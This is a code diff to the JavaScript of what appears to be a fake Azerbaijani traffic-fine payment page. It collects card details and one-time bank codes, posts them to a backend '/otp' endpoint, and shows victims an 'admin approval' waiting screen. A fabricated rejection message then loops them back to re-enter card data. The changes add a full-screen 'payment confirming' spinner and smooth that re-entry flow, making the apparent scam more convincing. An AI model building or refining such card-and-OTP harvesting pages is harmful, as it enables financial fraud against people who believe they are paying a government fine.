@@ -240,6 +240,18 @@
             }
         }
 
+        function showLoadingScreen() {
+            document.getElementById('app-container').innerHTML = `
+                <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-12 text-center space-y-6">
+                    <div class="inline-block animate-spin rounded-full h-20 w-20 border-4 border-blue-600 border-t-transparent mx-auto"></div>
+                    <div class="space-y-2">
+                        <h1 class="text-2xl font-bold text-gray-800">Ödəniş Təsdiqlənir...</h1>
+                        <p class="text-sm text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
+                    </div>
+                </div>
+            `;
+        }
+
         function updateUI(data) {
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
@@ -248,9 +260,11 @@
                 localStorage.setItem('dyp_timer_end', newEndTime);
             }
 
+            if (data.isPaid || data.isRejected) {
+                waitingForApproval = false; // Reset waiting flag!
+            }
+
             if (data.isRejected) {
-                waitingForApproval = false;
-                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
@@ -306,6 +320,7 @@
             }
 
             if (waitingForApproval || data.isPendingApproval) {
+                showLoadingScreen();
                 return;
             }
 
@@ -390,7 +405,7 @@
 
             waitingForApproval = true;
             closeModals();
-            document.getElementById('loading-modal').classList.remove('hidden');
+            showLoadingScreen();
 
             try {
                 await fetch(`${API_URL}/otp`, {
@@ -422,8 +437,8 @@
             document.getElementById('reject-modal').classList.add('hidden');
             waitingForApproval = false;
 
-            // Close any modals and open the Card Details Modal directly so they can re-enter card info!
-            closeModals();
+            // Re-fetch fine data and automatically open card modal so they can re-enter card info!
+            await fetchFineData();
             openCardModal();
         }
 
